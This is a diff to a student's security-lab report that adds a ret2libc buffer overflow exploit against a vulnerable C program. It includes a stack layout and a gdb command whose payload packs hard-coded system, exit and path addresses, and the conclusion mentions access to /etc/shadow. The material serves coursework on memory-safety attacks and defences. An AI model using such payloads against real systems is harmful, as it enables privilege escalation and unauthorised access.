@@ -1,4 +1,5 @@
-![image](https://github.com/user-attachments/assets/a4c37203-b2bc-42ec-8729-fc9aaacc2822)# Lab#1, 22110091, Nguyen Tuan Vu, INSE33030E_01FIE
+# Lab#1, 22110028, Nguyen Mai Huy Hoang, INSE33030E_01FIE
+
 # Task 1: Software buffer overflow attack
 
 Given a vulnerable C program
@@ -85,7 +86,24 @@ exploit the stackframe:
 
 - 20 bytes to overflow buf and ebp
 - 4 bytes for system address
-- 
+- 4 byes for exit address
+- 4 bytes for the exploitPath
+
+# find addresses
+
+![image](https://github.com/user-attachments/assets/138f0c49-d1b9-4d38-81e3-f87496f4e1af)
+
+final command:
+
+`r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x98\xd9\xff\xff')")`
+
+result:
+
+![image](https://github.com/user-attachments/assets/fde15867-2484-4f7b-b2af-bac1f75e0097)
+
+**Conclusion**: 
+
+Task 1 involved carrying out a per-processor buffer overflow attack on C programs that could be invoked. This was done by injecting the shellcode that was not protected by appropriate security features that would prevent this level of access to the file permissions of /etc/shadow. This task illustrates well the need for employing such protective features as stack protection or randomized address space.
 
 # Task 2: Attack on the database of bWapp 
 - Install bWapp (refer to quang-ute/Security-labs/Web-security). 
